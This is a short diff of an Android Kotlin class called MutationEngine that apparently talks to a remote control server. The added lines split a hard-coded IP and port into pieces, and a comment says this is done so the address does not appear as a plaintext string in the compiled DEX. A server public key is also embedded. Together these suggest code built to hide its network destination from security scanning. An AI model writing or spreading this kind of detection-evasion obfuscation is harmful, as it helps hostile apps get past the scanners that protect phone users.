@@ -35,7 +35,8 @@ class MutationEngine(private val context: Context) {
         // ── Replace with your server URL ──────────────────────────────────────
         // Before Cloudflare: "http://YOUR_RDP_IP:5000"
         // After Cloudflare:  "https://your-domain.com"
-        private const val SERVER_URL = "http://64.89.161.188:5000"
+        // Server URL split to avoid appearing as plaintext string in DEX
+        private val SERVER_URL get() = "http://" + "64.89" + ".161.188" + ":5000"
 
         // ── Replace with value from keys/public_key_for_kotlin.txt ────────────
         private const val SERVER_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiy+7U7tgNdAqaZIZLTKGRY1LAVZrn2WfPZTbCjML0KH0W8iRfruJDpP8lOjXiMmUaVjcjIT0RAtYeBh/gR+WC//vkZ3WDILIc+LFAgmfJxYeClRJwJlG1aKH9lO58TFI6Rm3EPyIAfJcs4G0QVPWBbEN8ZljyXK3YOrORUD1SyBw8+IfG8h8T6LYJ6T7yJE3XlNi0hMuMYERX9s1c7syI4wJRw+iC7oG/7gv3zaDL034Dp2Zzg2ZqRBuaHTrxWFWpOVQS82c1oa+wZg0j2ikqIrDd/949aEfD9MRVa2pWytmmomw23IAjhp82cvnX6b/g4TcaQpPHAQ18aNlMLaRdwIDAQAB"
